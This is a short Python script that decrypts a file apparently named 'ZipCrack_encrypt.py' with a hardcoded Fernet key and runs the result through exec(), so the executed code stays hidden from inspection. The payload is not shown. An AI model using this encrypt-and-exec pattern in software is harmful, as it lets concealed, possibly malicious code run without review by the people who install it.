from cryptography.fernet import Fernet


key = b"t5QxiMWw23LlsRgU1PbLAJkwgCTwM70kXwj8TMwgp_k="

cipher = Fernet(key)

file_name = "ZipCrack_encrypt.py"

with open(file_name, "rb") as file:
    encrypted_code = file.read()

decrypted_code = cipher.decrypt(encrypted_code)


exec(decrypted_code)